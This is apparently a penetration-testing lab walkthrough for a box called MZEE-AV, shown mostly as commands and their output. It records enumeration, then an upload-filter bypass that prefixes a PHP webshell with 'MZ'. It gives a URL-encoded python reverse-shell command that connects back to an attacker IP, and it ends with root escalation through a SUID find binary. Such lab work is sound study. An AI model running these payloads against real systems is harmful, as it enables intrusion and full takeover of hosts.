## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.147.33

# HOSTNAME                            // Found post initial foothold
mzeeav
# OPERATING SYSTEM                    // Found post initial foothold
 cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.56 ((Debian))
```
# ENUMERATION
## PORT 80
```bash
sudo whatweb $url | sed 's/,/\n/g'
http://192.168.147.33 [200 OK] Apache[2.4.56]
Country[RESERVED][ZZ]
HTTPServer[Debian Linux][Apache/2.4.56 (Debian)]
IP[192.168.147.33]
Script
Title[MZEE-AV - Check your files]

sudo curl -vs $url | html2text | less
[File]Upload
Check your PE-files with the online AV engine.
by MZEE-AV 2022

- Fuzzing
sudo feroxbuster -w /usr/share/wordlists/dirb/common.txt -C 403,404 -o fuzz/feroxbuster-common.txt -t 20 -u $url/
sudo feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -C 403,404 -o fuzz/feroxbuster-raft-large-files.txt -t 20 -u $url/
sudo feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -C 403,404 -o fuzz/feroxbuster-raft-large-directories.txt -t 20 -u $url/

- FOLDERS
http://192.168.147.33/upload/  
http://192.168.147.33/backups/
http://192.168.147.33/index.html

- FILES
http://192.168.147.33/backups/backup.zip
http://192.168.147.33/listing.php
http://192.168.147.33/upload.php



wget http://192.168.147.33/backups/backup.zip
unzip backup.zip
tree var         
var
└── www
    └── html
        ├── index.html
        ├── listing.php
        ├── upload
        │   ├── index.html
        │   ├── wget.exe
        │   └── whoami.exe
        └── upload.php

- From upload.php 
- we find converter binhex and magic byte 4D5A
- Decode bin2hex of 4D5A
https://encode-decode.com/bin2hex-decode-online/
- Decoded content - MZ
```
## INITIAL FOOTHOLD
```bash
cp /usr/share/davtest/backdoors/php_cmd.php ./cmd.php

- add MZ to the 1st line of cmd.php
nano cmd.php
MZ

- Upload cmd.php
cmd.php - MD5: ca6eb54442e483b30c519384916bcc93 - seems to be clean!

# Webshell
http://192.168.147.33/upload/cmd.php?cmd=id

# Proper shell 
sudo nc -nvlp 80

http://192.168.147.33/upload/cmd.php?cmd=export%20RHOST=%22192.168.45.152%22;export%20RPORT=80;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
```
## PRIVILEGE ESCALATION
```bash
# SUID 
find / -perm -u=s -type f 2>/dev/null
/opt/fileS

- Seems like copy of find command

# GTFOBINS
/opt/fileS . -exec /bin/sh -p \; -quit
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Dec 10 15:09:25 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.147.33
Nmap scan report for 192.168.147.33
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2024-12-10 15:09:27 IST for 21s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNEbgprJqVJa8R95Wkbo3cemB4fdRzos+v750LtPEnRs+IJQn5jcg5l89Tx4junU+AXzLflrMVo55gbuKeNTDtFRU9ltlIu4AU+f7lRlUlvAHlNjUbU/z3WBZ5ZU9j7Xc9WKjh1Ov7chC0UnDdyr5EGrIwlLzgk8zrWx364+S4JqLtER2/n0rhVxa9RCw0tR/oL24kMep4q7rFK6dThiRtQ9nsJFhh6yw8Fmdg7r4uohqH70UJurVwVNwFqtr/86e4VSSoITlMQPZrZFVvoSsjyL8LEODt1qznoLWudMD95Eo1YFSPID5VcS0kSElfYigjSr+9bNSdlzAof1mU6xJA67BggGNu6qITWWIJySXcropehnDAt2nv4zaKAUKc/T0ij9wkIBskuXfN88cEmZbu+gObKbLgwQSRQJIpQ+B/mA8CD4AiaTmEwGSWz1dVPp5Fgb6YVy6E4oO9ASuD9Q1JWuRmnn8uiHF/nPLs2LC2+rh3nPLXlV+MG/zUfQCrdrE=
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCUhhvrIBs53SApXKZYHWBlpH50KO3POt8Y+WvTvHZ5YgRagAEU5eSnGkrnziCUvDWNShFhLHI7kQv+mx+4R6Wk=
|   256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN4MSEXnpONsc0ANUT6rFQPWsoVmRW4hrpSRq++xySM9
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: MZEE-AV - Check your files
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 10 15:09:48 2024 -- 1 IP address (1 host up) scanned in 23.73 seconds
```

